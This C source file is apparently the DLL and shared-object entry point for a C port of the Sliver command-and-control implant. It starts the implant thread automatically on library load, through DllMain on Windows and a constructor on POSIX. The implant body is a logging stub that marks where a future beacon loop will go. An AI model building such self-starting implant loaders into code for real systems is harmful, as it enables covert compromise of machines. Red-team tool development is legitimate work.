/* src/entry/dllmain.c - shared-object / DLL entry point.
 *
 * Mirrors Sliver's implant/sliver/main.c:
 *   Windows : DllMain -> CreateThread(Start)   (never do network work inside DllMain)
 *   POSIX   : __attribute__((constructor)) on .so load
 */
#include <string.h>

#include "sliver/config.h"
#include "sliver/log.h"
#include "sliver/platform.h"

#ifndef IMPLANT_ENTRY_SYMBOL
#define IMPLANT_ENTRY_SYMBOL StartW
#endif

#if defined(_WIN32)
#define SLIVER_EXPORT __declspec(dllexport)
#else
#define SLIVER_EXPORT __attribute__((visibility("default")))
#endif

static volatile int g_running = 0;
static void *g_thread = 0;

static void implant_body(void *arg) {
  (void)arg;
  LOG_INFO("shared implant started (%s / build %s)", sliver_config_name(),
           sliver_config_build_id());
  /* M1: hand over to the session/beacon loop here. */
}

SLIVER_EXPORT void IMPLANT_ENTRY_SYMBOL(void) {
  if (g_running) {
    return;
  }
  g_running = 1;
  if (sliver_plat_init() != 0) {
    g_running = 0;
    return;
  }
  g_thread = sliver_thread_create(implant_body, 0);
}

#if defined(_WIN32)
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved) {
  (void)inst;
  (void)reserved;
  switch (reason) {
    case DLL_PROCESS_ATTACH:
      /* CreateThread() because DllMain must not block or do I/O. */
      IMPLANT_ENTRY_SYMBOL();
      break;
    case DLL_PROCESS_DETACH:
      g_running = 0;
      break;
    default:
      break;
  }
  return TRUE;
}
#else
__attribute__((constructor)) static void sliver_so_ctor(void) {
  IMPLANT_ENTRY_SYMBOL();
}
#endif
